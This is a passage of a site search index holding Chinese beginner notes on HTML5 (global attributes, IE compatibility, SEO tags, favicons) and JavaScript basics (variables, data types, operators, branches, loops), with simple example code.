控件，循环和设置大小属性\"]}]},\"/front-end/html-notes/10-HTML5%E6%96%B0%E5%A2%9E%E5%85%A8%E5%B1%80%E5%B1%9E%E6%80%A7.html\":{\"title\":\"HTML5新增全局属性\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"属性名\",\"功能\",\"contenteditable\",\"表示元素是否可被用户编辑，可选值：true：可编辑false：不可编辑\",\"draggable\",\"表示元素可以被拖动，可选值：true：可拖动false：不可拖动\",\"hidden\",\"隐藏元素\",\"spellcheck\",\"规定是否对元素进行拼写和语法检查，可选值：true：检查false：不检查\",\"contextmenu\",\"规定元素的上下文菜单，在用户鼠标右击元素时显示\",\"data-*\",\"用于存储页面的私有定制数据\"]}]},\"/front-end/html-notes/11-HTML5%E5%85%BC%E5%AE%B9%E6%80%A7%E5%A4%84%E7%90%86.html\":{\"title\":\"HTML5兼容性处理\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"添加元信息，让浏览器处于最优渲染模式\",\"<!--设置IE总是使用最新的文档模式进行渲染--> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=Edge\\\"> <!--优先使用 webkit ( Chromium ) 内核进行渲染, 针对360等浏览器--> <meta name=\\\"renderer\\\" content=\\\"webkit\\\"> \",\"使用 html5shiv 让低版本浏览器认识 H5 的语义化标签\",\"<!--[if lt ie 9]> <script src=\\\"html5shiv.js\\\"></script> <![endif]--> \",\"扩展：\",\"lt 小于\",\"lte 小于等于\",\"gt 大于\",\"gte 大于等于\",\"! 逻辑非\",\"示例：\",\"<!--[if IE 8]>仅IE8可见<![endif]--> <!--[if gt IE 8]>仅IE8以上可见<![endif]--> <!--[if lt IE 8]>仅IE8以下可见<![endif]--> <!--[if gte IE 8]>IE8及以上可见<![endif]--> <!--[if lte IE 8]>IE8及以下可见<![endif]--> \"]}]},\"/front-end/html-notes/12-SEO%E4%BC%98%E5%8C%96.html\":{\"title\":\"SEO优化\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"SEO（Search Engine Optimization），译为搜索引擎优化，是一种利用搜索引擎的规则提高网站在有关搜索引擎内自然排名的方式\",\"SEO 的目的是对网站进行深度的优化，从而帮助网站获取流量，进而在搜索引擎上提升网站的排名，提高网站的知名度\"]},{\"header\":\"1. 主要优化\",\"slug\":\"_1-主要优化\",\"contents\":[\"页面必须有三个标签用来符合 SEO 优化，即 TDK（title、description、keywords）\",\"title（网站标题）：\",\"title 具有不可替代性，是我们网页的一个重要标签，是搜索引擎了解网页的入口和对网页主题归属的最佳判断点\",\"建议：网站名-网站介绍\",\"description（网站说明）：\",\"简要说明我们的网站主要是做什么的\",\"提倡 description 作为网站的总体业务和主题概括\",\"keywords（关键字）：\",\"keywords 是页面关键字，是搜索引擎的关注点之一\",\"keywords 最好限制为 6~8 个关键词，关键词之间用英文逗号隔开，采用 关键字1,关键字2 的形式\",\"代码示例：\",\"<title>品优购商城-配送及时，正品低价</title> <!-- 网站说明 --> <meta name=\\\"description\\\" content=\\\"品优购-专业的综合网上购物商城……\\\" /> <!-- 关键字 --> <meta name=\\\"keywords\\\" content=\\\"网上购物,手机\\\" /> \"]},{\"header\":\"2. logo的优化\",\"slug\":\"_2-logo的优化\",\"contents\":[\"logo 放到 h1 标签里面，目的是为了提权，告诉搜索引擎，这个地方很重要\",\"h1 里面放一个链接，可以返回首页，把 logo 的背景图片给链接即可\",\"为了搜索引擎收录我们，我们链接里面要放文字，但是文字不要显示出来 \",\"text-indent 移到盒子外面（text-indent:-9999px），然后 overflow:hidden\",\"也可直接给 font-size:0; 就看不到文字了\",\"最后给链接一个 title 属性，这样鼠标放到 logo 上就可以看到提示文字了\"]}]},\"/front-end/html-notes/13-%E7%BD%91%E7%AB%99favicon%E5%9B%BE%E6%A0%87.html\":{\"title\":\"网站favicon图标\",\"contents\":[{\"header\":\"1. 什么是 favicon 图标\",\"slug\":\"_1-什么是-favicon-图标\",\"contents\":[\"favicon.ico 是网站的缩略标志，可以显示在浏览器标签、地址栏左边和收藏夹中，是展示网站个性的缩略 logo 标志，也可以说是网站头像，目前主要的浏览器都支持 favicon.ico 图标\",\"如淘宝网：\",\"网站favicon图标.png\"]},{\"header\":\"2. 如何为网站添加 favicon 图标\",\"slug\":\"_2-如何为网站添加-favicon-图标\",\"contents\":[\"制作 favicon 图标：使用在线转换网站将图片转换为 ico 格式\",\"将 favicon 图标放到网站根目录下\",\"在 HTML 页面引入 favicon 图标，语法： <link rel=\\\"shortcut icon\\\" href=\\\"favicon.ico\\\" />\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"zh-CN\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>标题</title> <!-- favicon图标 --> <link rel=\\\"shortcut icon\\\" href=\\\"favicon.ico\\\" /> </head> <body> </body> </html> \"]}]},\"/front-end/html-notes/\":{\"title\":\"HTML笔记\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"HTML学习过程中的笔记\"]}]},\"/front-end/javascript-notes/01-JavaScript-%E7%AE%80%E4%BB%8B.html\":{\"title\":\"简介\",\"contents\":[{\"header\":\"1. JavaScript的组成\",\"slug\":\"_1-javascript的组成\",\"contents\":[\"ECMASCRIPT: 定义了 JavaScript 的语法规范, 描述了语言的基本语法和数据类型\",\"BOM (Browser Object Model): 浏览器对象模型\",\"有一套成熟的可以操作浏览器的 API，通过 BOM 可以操作浏览器。比如： 弹出框、浏览器跳转、获取分辨率等\",\"DOM (Document Object Model): 文档对象模型\",\"有一套成熟的可以操作页面元素的 API，通过 DOM 可以操作页面中的元素。比如： 增加一个 div，减少个一div，给 div 换个位置等\"]},{\"header\":\"2. JavaScript用途\",\"slug\":\"_2-javascript用途\",\"contents\":[\"常见的网页效果，如表单验证，轮播图等\",\"与 H5配合实现游戏\",\"实现应用级别的程序\",\"实现图表统计效果\",\"可以实现人工智能\",\"后端开发，app开发，桌面端开发等\"]},{\"header\":\"3. JavaScript的语言风格和特性\",\"slug\":\"_3-javascript的语言风格和特性\",\"contents\":[\"类 C 语言风格，容易上手\",\"弱类型（动态类型），简单易学\",\"丰富的功能，无敌的生态，强大的性能\"]}]},\"/front-end/javascript-notes/02-JavaScript-%E5%BC%95%E5%85%A5%E6%96%B9%E5%BC%8F.html\":{\"title\":\"引入方式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"JavaScript 程序不能独立运行，它需要被嵌入 HTML 中，然后浏览器才能执行 JavaScript 代码。通过 script 标签将 JavaScript 代码引入到 HTML 中\"]},{\"header\":\"1. 内部方式\",\"slug\":\"_1-内部方式\",\"contents\":[\"通过 script 标签包裹 JavaScript 代码\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 引入方式</title> </head> <body> <!-- 内部形式：通过 script 标签包裹 JavaScript 代码 --> <script> // JavaScript代码 </script> </body> </html> \",\"注意：将 JavaScript 代码放在 HTML 页面的底部附近通常是最好的策略\"]},{\"header\":\"2. 外部方式\",\"slug\":\"_2-外部方式\",\"contents\":[\"一般将 JavaScript 代码写在独立的以 .js 结尾的文件中，然后通过 script 标签的 src 属性引入\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 引入方式</title> </head> <body> <!-- 外部形式：通过 script 的 src 属性引入独立的 .js 文件 --> <script src=\\\"xxx.js\\\"></script> </body> </html> \",\"如果 script 标签使用 src 属性引入了某 .js 文件，那么标签的代码会被忽略！！！\",\"如下代码所示：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 引入方式</title> </head> <body> <!-- 外部形式：通过 script 的 src 属性引入独立的 .js 文件 --> <script src=\\\"xxx.js\\\"> // 此处的代码会被忽略掉！！！！ // JavaScript代码 </script> </body> </html> \"]},{\"header\":\"3. 内联方式\",\"slug\":\"_3-内联方式\",\"contents\":[\"代码写在标签内部\",\"例：\",\"<body> <button onclick=\\\"alert('逗你玩~~~')“>点我</button> </body> \"]}]},\"/front-end/javascript-notes/03-JavaScript-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA.html\":{\"title\":\"输入输出\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"输入和输出也可理解为人和计算机的交互，用户通过键盘、鼠标等向计算机输入信息，计算机处理后再展示结果给用户，这便是一次输入和输出的过程\",\"JavaScript本身没有任何打印或者输出的函数，但是我们可以使用其它方式输出和输入数据\"]},{\"header\":\"1. 输出\",\"slug\":\"_1-输出\",\"contents\":[\"JavaScript 可以接收用户的输入，然后再将输入的结果输出：alert()、document.write()、console.log()\",\"alert() 或 document.write() 会在浏览器中展示（输出）给用户\",\"console.log() 可以在控制台打印\",\"后面章节会深入探讨以上方法，目前学习的内容是为了方便我们在运行程序时看到结果\"]},{\"header\":\"2. 输入\",\"slug\":\"_2-输入\",\"contents\":[\"向 prompt() 输入任意内容会以弹窗形式出现在浏览器中，一般提示用户输入一些内容\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 输入输出</title> </head> <body> <script> // 1. 展示给用户 document.write('要输出的内容') alert('要输出的内容') console.log('要输出的内容') // 2. 以弹窗形式提示用户输入姓名，注意这里的文字使用英文的引号 prompt('请输入您的姓名:') </script> </body> </html> \",\"后面章节会深入探讨以上方法，目前学习的内容是为了方便我们在运行程序时看到结果\"]}]},\"/front-end/javascript-notes/04-JavaScript-%E6%B3%A8%E9%87%8A%E4%B8%8E%E7%BB%93%E6%9D%9F%E7%AC%A6.html\":{\"title\":\"注释与结束符\",\"contents\":[{\"header\":\"1. 注释\",\"slug\":\"_1-注释\",\"contents\":[\"通过注释可以阻止代码被执行或者添加备注信息，JavaScript 支持两种形式注释语法\"]},{\"header\":\"1.1 单行注释\",\"slug\":\"_1-1-单行注释\",\"contents\":[\"使用 // 注释单行代码\",\"VSCode中快捷键：ctrl+/\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 注释</title> </head> <body> <script> // 这种是单行注释的语法 // 一次只能注释一行 // 可以重复注释 </script> </body> </html> \"]},{\"header\":\"1.2 多行注释\",\"slug\":\"_1-2-多行注释\",\"contents\":[\"使用 /* */ 注释多行代码\",\"VSCode中快捷键：shift+alt+A\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 注释</title> </head> <body> <script> /* 这种的是多行注释的语法 */ /* 更常见的多行注释是这种写法 可以任意换行 多少行都可以 */ </script> </body> </html> \"]},{\"header\":\"2. 结束符\",\"slug\":\"_2-结束符\",\"contents\":[\"在 JavaScript 中 ; 代表一段代码的结束，多数情况下可以省略 ; 使用回车（enter）替代\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 结束符</title> </head> <body> <script> alert(1); alert(2); alert(1) alert(2) </script> </body> </html> \",\"实际开发中有许多人主张书写 JavaScript 代码时省略结束符 ;\"]}]},\"/front-end/javascript-notes/05-JavaScript-%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F.html\":{\"title\":\"严格模式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"严格模式：\",\"<script> 'use strict'//在代码开头添加该语句，即表示在严格模式下 <script> \"]}]},\"/front-end/javascript-notes/06-JavaScript-%E5%8F%98%E9%87%8F.html\":{\"title\":\"变量\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"变量指的是在程序中保存数据的一个容器，变量是计算机内存中存储数据的标识符，根据变量名称可以获取到内存中存储的数据，也就是说，我们向内存中存储了一个数据，然后要给这个数据起一个名字，为了是我们以后再次找到它\"]},{\"header\":\"1. 定义变量及赋值\",\"slug\":\"_1-定义变量及赋值\",\"contents\":[\"// 定义一个变量 var num // 给一个变量赋值 num = 100 // 定义一个变量的同时给其赋值 var num2 = 200 \",\"注意：\",\"一个变量名只能存储一个值\",\"当再次给一个变量赋值的时候，前面一次的值就没有了\",\"变量名称区分大小写（JS 严格区分大小写）\"]},{\"header\":\"2. 变量的命名规则和命名规范\",\"slug\":\"_2-变量的命名规则和命名规范\",\"contents\":[\"规则： 必须遵守的，不遵守就是错\",\"一个变量名称可以由数字、字母、英文下划线 _、美元符号 $ 组成\",\"严格区分大小写\",\"不能由数字开头\",\"不能是保留字或者关键字\",\"不要出现空格\",\"规范： 建议遵守的（开发者默认），不遵守不会报错\",\"变量名尽量有意义（语义化）\",\"遵循驼峰命名规则，由多个单词组成的时候，从第二个单词开始首字母大写\",\"不要使用中文\"]},{\"header\":\"3. 变量提示\",\"slug\":\"_3-变量提示\",\"contents\":[\"变量声明的提升：可以提前使用一个稍后才声明的变量，而不会引发异常\",\"在执行所有代码前，JS 有预解析阶段，会预读所有变量的声明（不会提升赋值，只会提升定义）\",\"// 变量声明提升的只是定义，不提升赋值！！！ // 先使用变量 console.log(a) // undefined var a = 10 // 后定义变量 console.log(a) // 10 \",\"实际的情况相当于：\",\"var a console.log(a) // undefined a = 10 console.log(a) // 10 \"]}]},\"/front-end/javascript-notes/07-JavaScript-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.html\":{\"title\":\"数据类型\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"数据类型是指存储在内存中的数据的类型，通常分为两大类 基本数据类型 和 复杂数据类型\"]},{\"header\":\"1. 基本数据类型\",\"slug\":\"_1-基本数据类型\",\"contents\":[\"基本数据类型又叫做简单类型或者值类型，在存储时变量中存储的是值本身，因此叫做值类型，如 string，number，boolean，undefined，null\",\"数值类型（number） \",\"一切数字都是数值类型（包括二进制，十进制，十六进制等）\",\"NaN（not a number），一个非数字，NaN 代表一个计算错误，它是一个不正确的或一个未定义的数学操作所得到的结果，NaN 是粘性的，任何对 NaN 的操作都会返回 NaN\",\"字符串类型（string） \",\"被引号包裹的所有内容（可以是单引号''也可以是双引号\\\"\\\"）,单引号和双引号没有本质上的区别，推荐使用单引号\",\"注意： \",\"无论单引号或是双引号必须成对使用\",\"单引号/双引号可以互相嵌套，但是不可以自已嵌套自已\",\"必要时可以使用转义符 \\\\，输出单引号或双引号\",\"布尔类型（boolean） \",\"只有两个（true 或者 false）\",\"null类型（null） \",\"只有一个，就是 null，表示”空“、”无“或”值未知“的意思\",\"未定义类型（undefined） \",\"未定义是比较特殊的类型，只有一个值 undefined，只声明变量，不赋值的情况下，变量的默认值为 undefined，一般很少直接为某个变量赋值为 undefined\"]},{\"header\":\"2. 复杂数据类型\",\"slug\":\"_2-复杂数据类型\",\"contents\":[\"复杂数据类型，在存储时变量中存储的仅仅是地址（引用），因此叫做引用数据类型\",\"通过 new 关键字创建的对象（系统对象、自定义对象），如 Object、Array、Date 等\"]},{\"header\":\"3. 判断数据类型\",\"slug\":\"_3-判断数据类型\",\"contents\":[\"使用 typeof 关键字来检测数据类型\",\"// 第一种使用方式 var n1 = 100 console.log(typeof n1)// number // 第二种使用方式 var s1 = 'abcdefg' console.log(typeof(s1))// string \"]},{\"header\":\"4. 数据类型转换\",\"slug\":\"_4-数据类型转换\",\"contents\":[\"数据类型之间的转换，比如数字转成字符串，字符串转成布尔，布尔转成数字等\",\"JavaScript 是弱类型语言：JavaScript 也不知道变量到底属于哪种数据类型，只有赋值了才清楚\"]},{\"header\":\"4.1 其他数据类型转成数值\",\"slug\":\"_4-1-其他数据类型转成数值\",\"contents\":[\"Number(变量)\",\"可以把一个变量强制转换成数值类型\",\"可以转换小数，会保留小数\",\"可以转换布尔值\",\"遇到不可转换的都会返回 NaN\",\"parseInt(变量)\",\"从第一位开始检查，是数字就转换，直到一个不是数字的内容\",\"开头就不是数字，那么直接返回 NaN\",\"不认识小数点，只能保留整数\",\"parseFloat(变量)\",\"从第一位开始检查，是数字就转换，直到一个不是数字的内容\",\"开头就不是数字，那么直接返回 NaN\",\"认识一次小数点\",\"除了加法以外的数学运算\",\"运算符两边都是可运算数字才行\",\"如果运算符任何一边不是一个可运算数字，那么就会返回 NaN\",\"加法不可以用\"]},{\"header\":\"4.2 其他数据类型转成字符串\",\"slug\":\"_4-2-其他数据类型转成字符串\",\"contents\":[\"变量.toString()\",\"有一些数据类型不能使用 toString() 方法，比如 undefined 和 null\",\"String(变量)\",\"所有数据类型都可以\",\"使用加法运算\",\"在 JS 里面，+ 由两个含义 \",\"字符串拼接： 只要 + 任意一边是字符串，就会进行字符串拼接\",\"加法运算：只有 + 两边都是数字的时候，才会进行数学运算\"]},{\"header\":\"4.3 其他数据类型转成布尔\",\"slug\":\"_4-3-其他数据类型转成布尔\",\"contents\":[\"Boolean(变量)\",\"在 js 中，只有 ''、0、null、undefined、NaN，这些是 false\",\"其余都是 true\"]},{\"header\":\"5. 数据类型之间存储的区别\",\"slug\":\"_5-数据类型之间存储的区别\",\"contents\":[\"既然我们区分了基本数据类型和复杂数据类型，那么他们之间就一定会存在一些区别，他们最大的区别就是在存储上的区别\",\"我们的存储空间分成两种：\",\"栈： 主要存储基本数据类型的内容\",\"堆： 主要存储复杂数据类型的内容\"]},{\"header\":\"5.1 基本数据类型在内存中的存储情况\",\"slug\":\"_5-1-基本数据类型在内存中的存储情况\",\"contents\":[\"var num = 100，在内存中的存储情况，直接在 栈空间 内有存储一个数据\"]},{\"header\":\"5.2 复杂数据类型在内存中的存储情况\",\"slug\":\"_5-2-复杂数据类型在内存中的存储情况\",\"contents\":[\"复杂数据类型的存储\",\"在堆里面开辟一个存储空间\",\"把数据存储到存储空间内\",\"把存储空间的地址赋值给栈里面的变量\"]},{\"header\":\"6. 数据类型之间比较的区别\",\"slug\":\"_6-数据类型之间比较的区别\",\"contents\":[\"基本数据类型是 值 之间的比较\",\"var num = 1 var str = '1' console.log(num == str) // true \",\"复杂数据类型是 地址 之间的比较\",\"var obj = { name: 'Jack' } var obj2 = { name: 'Jack' } console.log(obj == obj2) // false \",\"因为我们创建了两个对象，那么就会在 堆空间 里面开辟两个存储空间存储数据（两个地址），虽然存储的内容是一样的，那么也是两个存储空间，两个地址，复杂数据类型之间就是地址的比较，所以 obj 和 obj2 两个变量的地址不一样，所以我们得到的就是 false\"]}]},\"/front-end/javascript-notes/08-JavaScript-%E8%BF%90%E7%AE%97%E7%AC%A6.html\":{\"title\":\"运算符\",\"contents\":[{\"header\":\"1. 算术运算符\",\"slug\":\"_1-算术运算符\",\"contents\":[\"算术运算符：也叫数学运算符，主要包括加、减、乘、除、取余（求模）等\",\"+\",\"只有符号两边都是数字的时候才会进行加法运算\",\"只要符号任意一边是字符串类型，就会进行字符串拼接\",\"-\",\"会执行减法运算\",\"会自动把两边都转换成数字进行运算\",\"*\",\"会执行乘法运算\",\"会自动把两边都转换成数字进行运算\",\"/\",\"会执行除法运算\",\"会自动把两边都转换成数字进行运算\",\"%\",\"会执行取余运算\",\"会自动把两边都转换成数字进行运算\",\"注意：在计算失败时，显示的结果是 NaN（not a number）\"]},{\"header\":\"2. 赋值运算符\",\"slug\":\"_2-赋值运算符\",\"contents\":[\"赋值运算符：对变量进行赋值的运算符\",\"= 将等号右边的值赋予给左边, 要求左边必须是一个容器\",\"运算符\",\"作用\",\"+=\",\"加法赋值\",\"-+\",\"减法赋值\",\"*=\",\"乘法赋值\",\"/=\",\"除法赋值\",\"%=\",\"取余赋值\"]},{\"header\":\"3. 比较运算符\",\"slug\":\"_3-比较运算符\",\"contents\":[\"使用场景：比较两个数据是否相等，根据比较结果返回一个布尔值（true / false）\",\"运算符\",\"作用\",\">\",\"左边是否大于右边\",\"<\",\"左边是否小于右边\",\">=\",\"左边是否大于或等于右边\",\"<=\",\"左边是否小于或等于右边\",\"===\",\"左右两边是否类型和值都相等（重点）\",\"==\",\"左右两边值是否相等\",\"!=\",\"左右值不相等\",\"!==\",\"左右两边是否不全等\",\"例：\",\" console.log(3 > 5) console.log(3 >= 3) console.log(2 == 2) // 比较运算符有隐式转换 把'2' 转换为 2 双等号 只判断值 console.log(2 == '2') // true // console.log(undefined === null) // === 全等 判断 值 和 数据类型都一样才行 // 以后判断是否相等 请用 === console.log(2 === '2') console.log(NaN === NaN) // NaN 不等于任何人，包括他自己 console.log(2 !== '2') // true console.log(2 != '2') // false console.log('-------------------------') console.log('a' < 'b') // true console.log('aa' < 'ab') // true console.log('aa' < 'aac') // true console.log('-------------------------') \"]},{\"header\":\"4. 逻辑运算符\",\"slug\":\"_4-逻辑运算符\",\"contents\":[]},{\"header\":\"4.1 基本使用\",\"slug\":\"_4-1-基本使用\",\"contents\":[\"使用场景：可以把多个布尔值放到一起运算，最终返回一个布尔值\",\"符号\",\"名称\",\"日常读法\",\"特点\",\"口诀\",\"&&\",\"逻辑与\",\"并且\",\"符号两边有一个假的结果为假\",\"一假则假\",\"||\",\"逻辑或\",\"或者\",\"符号两边有一个真的结果为真\",\"一真则真\",\"!\",\"逻辑非\",\"取反\",\"true变false false变true\",\"真变假，假变真\",\"A\",\"B\",\"A && B\",\"A || B\",\"!A\",\"false\",\"false\",\"false\",\"false\",\"true\",\"false\",\"true\",\"false\",\"true\",\"true\",\"true\",\"false\",\"false\",\"true\",\"false\",\"true\",\"true\",\"true\",\"true\",\"false\",\" // 逻辑与 一假则假 console.log(true && true) console.log(false && true) console.log(3 < 5 && 3 > 2) console.log(3 < 5 && 3 < 2) console.log('-----------------') // 逻辑或 一真则真 console.log(true || true) console.log(false || true) console.log(false || false) console.log('-----------------') // 逻辑非 取反 console.log(!true) console.log(!false) console.log('-----------------') let num = 6 console.log(num > 5 && num < 10) console.log('-----------------') \"]},{\"header\":\"4.2 逻辑中断\",\"slug\":\"_4-2-逻辑中断\",\"contents\":[\"断路：只存在于 && 和 || 中，当满足一定条件会让右边代码不执行\",\"符号\",\"短路条件\",\"&&\",\"左边为 false 就断路\",\"||\",\"左边为 true 就断路\",\"原因：通过左边能得到整个式子的结果，因此没必要再判断右边\",\"运算结果：无论 && 还是 ||，运算结果都是最后被执行的表达式值，一般用在变量赋值\",\"例：\",\"console.log(false && 20) //false console.log(5 < 3 && 20) //false console.log(undefined && 20) //undefined console.log(null && 20) //null console.log(0 && 20) //0 console.log(10 && 20) //20 console.log(false || 20) //20 console.log(5 < 3 || 20) //20 console.log(undefined || 20) //20 console.log(null || 20) //20 console.log(0 || 20) //20 console.log(10 || 20) //10 \"]},{\"header\":\"4.3 逻辑运算符优先级\",\"slug\":\"_4-3-逻辑运算符优先级\",\"contents\":[\"！> && > ||\"]},{\"header\":\"5. 自增自减运算符\",\"slug\":\"_5-自增自减运算符\",\"contents\":[\"++\",\"进行自增运算\",\"分成两种，前置++ 和 后置++\",\"前置++，会先把值自动 +1，再返回\",\"var a = 10 console.log(++a) // 会返回 11，并且把 a 的值变成 11 \",\"后置++，会先把值返回，再自动+1\",\"var a = 10 console.log(a++) // 会返回 10，然后把 a 的值变成 11 \",\"--\",\"进行自减运算\",\"分成两种，前置-- 和 后置--\",\"和 ++ 运算符道理一样\"]},{\"header\":\"6. 三元运算符\",\"slug\":\"_6-三元运算符\",\"contents\":[\"三元运算，就是用 两个符号 组成一个语句\",\"语法：\",\"条件 ? 条件为 true 的时候执行 : 条件为 false 的时候执行 \",\"例：\",\"var age = 18 age >= 18 ? alert('已经成年') : alert('没有成年') \"]}]},\"/front-end/javascript-notes/09-JavaScript-%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84.html\":{\"title\":\"分支结构\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"分支结构可以根据条件判断真假，来选择性的执行想要的代码\",\"分支结构包含：\",\"if分支结构（重点）\",\"三元运算符\",\"switch分支结构\"]},{\"header\":\"1. if条件分支结构\",\"slug\":\"_1-if条件分支结构\",\"contents\":[]},{\"header\":\"1.1 if分支结构\",\"slug\":\"_1-1-if分支结构\",\"contents\":[\"语法：\",\"if(条件表达式) { // 满足条件要执行的语句 } \",\"小括号内的条件结果是布尔值，为 true 时，进入大括号里执行代码，若为 false ，则不执行大括号里面代码\",\"小括号内的结果若不是布尔类型时，会发生类型转换为布尔值，类似Boolean()\",\"如果大括号只有一个语句，大括号可以省略，但是，不提倡这样做\",\"例：\",\"// 1. 用户输入 var score = +prompt('请输入成绩') // 2. 进行判断输出 if (score >= 700) { alert('恭喜考上清华！') } \"]},{\"header\":\"1.2 if双分支结构\",\"slug\":\"_1-2-if双分支结构\",\"contents\":[\"如果有两个条件的时候，可以使用 if else 双分支语句\",\"语法：\",\"if (条件表达式){ // 满足条件要执行的语句 } else { // 不满足条件要执行的语句 } \",\"例：\",\"// 1. 用户输入 var uname = prompt('请输入用户名:') var pwd = prompt('请输入密码:') // 2. 判断输出 if (uname === 'zhf' && pwd === '123456') { alert('恭喜登录成功') } else { alert('用户名或者密码错误') } \"]},{\"header\":\"1.3 if多分支结构\",\"slug\":\"_1-3-if多分支结构\",\"contents\":[\"使用场景： 适合于有多个条件的时候\",\"例：\",\"// 1. 用户输入 var score = +prompt('请输入成绩：') // 2. 判断输出 if (score >= 90) { alert('成绩优秀，宝贝，你是我的骄傲') } else if (score >= 70) { alert('成绩良好，宝贝，你要加油哦~~') } else if (score >= 60) { alert('成绩及格，宝贝，你很危险~') } else { alert('成绩不及格，宝贝，我不想和你说话，我只想用鞭子和你说话~') } \"]},{\"header\":\"2. switch条件分支结构\",\"slug\":\"_2-switch条件分支结构\",\"contents\":[\"使用场景： 适用于有多个条件的时候，也属于分支语句，大部分情况下和 if 多分支语句功能相同\",\"语法：\",\"switch (要判断的变量) { case 情况1: 情况1要执行的代码 break case 情况2: 情况2要执行的代码 break case 情况3: 情况3要执行的代码 break default: 上述情况都不满足的时候执行的代码 } \",\"例：根据变量给出的数字显示是星期几\",\"var week = 1 switch (week) { case 1: alert('星期一') break case 2: alert('星期二') break case 3: alert('星期三') break case 4: alert('星期四') break case 5: alert('星期五') break case 6: alert('星期六') break case 7: alert('星期日') break default: alert('请输入一个 1 ～ 7 之间的数字') } \",\"注意：\",\"switch case 语句一般用于等值判断, if 适合于区间判断\",\"switch case 一般需要配合 break 关键字使用，没有 break 会造成 case 穿透\",\"if 多分支语句开发要比 switch 更重要，使用也更多\"]},{\"header\":\"3. if和switch的区别\",\"slug\":\"_3-if和switch的区别\",\"contents\":[\"共同点 \",\"都能实现多分支选择，多选一\",\"大部分情况下可以互换\",\"区别： \",\"switch…case 语句通常处理 case 为比较确定值的情况，而 if…else…语句更加灵活，通常用于范围判断(大于，等于某个范围)\",\"switch 语句进行判断后直接执行到程序的语句，效率更高，而 if…else 语句有几种判断条件，就得判断多少次\",\"switch 一定要注意必须是 === 全等，一定注意数据类型，同时注意 break 否则会有穿透效果\",\"结论： \",\"当分支比较少时，if…else 语句执行效率高\",\"当分支比较多时，switch 语句执行效率高，而且结构更清晰\"]}]},\"/front-end/javascript-notes/10-JavaScript-%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84.html\":{\"title\":\"循环结构\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"循环结构，就是根据某些给出的条件，重复的执行同一段代码\",\"循环三要素：\",\"初始值 （经常用变量）\",\"终止条件\",\"变量的变化量\"]},{\"header\":\"1. while循环\",\"slug\":\"_1-while循环\",\"contents\":[\"while，中文叫当…时，其实就是当条件满足时就执行代码，一旦不满足了就不执行了\",\"语法：\",\"while (条件表达式) { // 循环体 } \",\"因为满足条件就执行，所以我们写的时候一定要注意，就是设定一个边界值，不然就一直循环下去了\",\"例：\",\"// 1. 初始值 var num = 0; // 2. 终止条件 while (num < 10) { // 3. 要执行的代码 console.log('当前的 num 的值是 ' + num) // 4. 变量的变化量 num = num + 1 } \"]},{\"header\":\"2. do while循环\",\"slug\":\"_2-do-while循环\",\"contents\":[\"是一个和 while 循环类似的循环，while 会先进行条件判断，满足就执行，不满足直接就不执行了，但是 do while 循环是先不管条件，先执行一回，然后再开始进行条件判断\",\"语法：\",\"do { 要执行的代码 } while (条件) \",\"例：\",\"// 下面这个代码，条件一开始就不满足，但是依旧会执行一次 do 后面 {} 内部的代码 var num = 10 do { console.log('我执行了一次') num = num + 1 } while (num < 10) \"]},{\"header\":\"3. for循环\",\"slug\":\"_3-for循环\",\"contents\":[\"语法：\",\"for(起始值; 终止条件; 变化量) { // 要重复执行的代码 } \",\"例：\",\"// 把初始化，条件判断，自身改变，写在了一起 for (var i = 1; i <= 10; i++) { // 这里写的是要执行的代码 console.log(i) } // 控制台会依次输出 1 ~ 10 \"]},{\"header\":\"4. for循环嵌套\",\"slug\":\"_4-for循环嵌套\",\"contents\":[\"循环之中又嵌套了另一个循环，外层循环循环一次，里层循环循环全部\",\"例：\",\"// 1. 外面的循环 for (var i = 1; i < 4; i++) { console.log(i) // 2. 里层的循环 for (var j = 1; j < 6; j++) { console.log(j) } } \"]},{\"header\":\"5. break终止循环\",\"slug\":\"_5-break终止循环\",\"contents\":[\"在循环没有进行完毕的时候，因为我设置的条件满足，提前终止循环\",\"比如：我要吃五个包子，吃到三个的时候，不能再吃了，我就停止吃包子这个事情\",\"要终止循环，就可以直接使用 break 关键字\",\"for (var i = 1; i <= 5; i++) { // 每循环一次，吃一个包子 console.log('我吃了一个包子') // 当 i 的值为 3 的时候，条件为 true，执行 {} 里面的代码终止循环 // 循环就不会继续向下执行了，也就没有 4 和 5 了 if (i === 3) { break } } \"]},{\"header\":\"6. 